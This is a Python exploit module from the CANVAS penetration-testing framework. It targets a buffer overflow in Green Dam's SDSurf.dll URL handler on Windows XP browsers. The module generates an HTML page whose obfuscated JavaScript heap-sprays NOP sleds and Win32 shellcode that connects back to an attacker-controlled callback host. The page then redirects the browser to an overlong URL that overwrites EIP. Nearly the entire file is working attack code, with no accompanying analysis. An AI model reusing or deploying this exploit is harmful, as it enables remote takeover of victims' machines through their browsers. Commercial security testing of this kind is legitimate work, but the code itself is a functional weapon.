#! /usr/bin/env python

#
# CANVAS Exploit
#

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys

if "." not in sys.path: sys.path.append(".")

import os,getopt
import socket
from exploitutils import *
from encoder import intel_nibbleencoder, xorencoder
from shellcode import shellcodeGenerator, win32shell # win32shell / linuxshell ???
from tcpexploit import tcpexploit
import canvasengine
from canvasengine import socket_save_list
import time
import mosdef
from httpclientside import httpclientside

NAME="GreenDam URL Overflow"
DESCRIPTION="Overflow in URL handler SDSurf.dll that is injected into all browser processes by Green Dam."
DOCUMENTATION={}
DOCUMENTATION["VENDOR"]       = "Green Dam"
DOCUMENTATION["Date public"]  = "06/15/2009"
DOCUMENTATION["CERT Advisory"]= "N/A"
DOCUMENTATION["Repeatability"]= "Infinite"
DOCUMENTATION["References"]   = "N/A"
DOCUMENTATION["CVE Name"]     = "N/A"
DOCUMENTATION["CVE Url"]      = "N/A"
DOCUMENTATION["Notes"]        = "Tested against Firefox 3.0.11 and IE 6/7"
DOCUMENTATION["Tutorial"]     = ""

VERSION="1.0"
GTK2_DIALOG="dialog.glade2"

PROPERTY            = {}
PROPERTY['TYPE']    = "Exploit"
PROPERTY['SITE']    = "Client Side"
PROPERTY['ARCH']    = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "XP" ]
PROPERTY['MSADV']   = ''
PROPERTY['DELIVERY'] = 'HTTP'


NOTES="""
To test from Commandline (it needs fromcreatethread)
   bash-3.00$ ./commandlineInterface.py -v 1 -p 5555
   bash-3.00$ exploits/httpserver/httpserver.py -O singleexploit:greendam_url -l 192.168.1.1 -p 8080 -d 5555
"""

CHANGELOG="""

"""

      
class theexploit(tcpexploit,httpclientside):
    def __init__(self):
        tcpexploit.__init__(self)
        httpclientside.__init__(self)

        #self.searchMethod = self.FindBrowser_FindAnyTag_CmpExtraInfo
        #self.UserAgent = [("Mozilla/", "MSIE", "")]
        self.version   = 1
        self.badstring = "\x20\x00\r\nABCDEFGHIJKLMNOPQRSTUVWXYZ"
        self.name      = NAME 
        self.filename  = "index.html"
        self.listenerArgsDict["fromcreatethread"] = 0
        self.shellcode = ""
        self.responded = 0
	self.httphost  = "127.0.0.1"
	self.httpport  = "80"
        return


    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]
    
    def createShellcode(self): 
        
        self.createWin32Shellcode( "",self.callback.ip, self.callback.port )
        return self.shellcode
        
        
    def run(self):
        
        self.host=self.target.interface
        self.filename=self.argsDict.get("filename",self.filename)
        
        filedata=self.makefile()
        self.log("Opening %s for output"%self.filename)
        fd=file(self.filename,"wb+")
        fd.write(filedata)
        fd.close()
        self.log("Wrote to %s"%self.filename)
        return 1
    
    def get_host_string( self ):

	host = "http://HTTPHOST:HTTPPORT/"
	
	try:
	    if self.parent.bindip != "0.0.0.0":
		host = host.replace("HTTPHOST",     self.parent.bindip )
	    else:
		host = host.replace("HTTPHOST",     self.callback.ip )
		
	    host = host.replace("HTTPPORT",     str(self.parent.port) )

	except:

	    httphost = self.argsDict.get('httphost', self.httphost )
	    httpport = self.argsDict.get('httpport', self.httpport )
	    
	    host = host.replace("HTTPHOST", httphost )
	    host = host.replace("HTTPPORT", str(httpport) )
	
	return host

    def makefile(self, type = None):        
        
        self.createShellcode()
        filedata = "<html><head><script>$JAVASCRIPT</script></head><body>Redirecting, please wait.</body>"
        
	javascript = """
	function repeat(count,what) {
          var v = "";
          while (--count >= 0) v += what;
          return v;
	  }

var sc = unescape("SHELLCODE");
blah = repeat(128, unescape("%u9090%u9090%u9090%u9090%u9090")) + sc;
bigblock = unescape("%u9090%u9090");
headersize = 20;
wap = headersize+blah.length
while (bigblock.length<wap) bigblock+=bigblock;
fillblock = bigblock.substring(0, wap);
block = bigblock.substring(0, bigblock.length-wap);
while(block.length+wap<0x40000) block = block+block+fillblock;
mm = new Array();
for (i=0;i<1400;i++) mm[i] = block + blah;

document.location.assign("$GREENSLAM");
"""
       
	
        host  = self.get_host_string()
	delta = 1038 - len(host)	

	self.log("Padding with %d bytes" % delta)
	href = "A" * delta
	
        eip = "\x0b\x0b\x0b\x0b"
                
        slam_url = host + href + eip + href

	# Create the javascript, and obfuscate it
	javascript = javascript.replace('SHELLCODE',urluencode('AAAA'+self.shellcode))
	javascript = javascript.replace("$GREENSLAM", slam_url)
	javascript = self.obfuscate_javascript( javascript )
	
	filedata = filedata.replace("$JAVASCRIPT", javascript )
       
        return filedata
        
        
    def makesploit(self,clientheader,clientbody):
        """
        Construct the attack
        """
    
        from libs.spkproxy import header, body
        h=header("SERVER")
        b=body()

        # Serve up our HTML page that redirects to overflow URL
        sploitstring=self.makefile()
        b.setBody(sploitstring)
        self.responded = 1
        return h,b



if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    

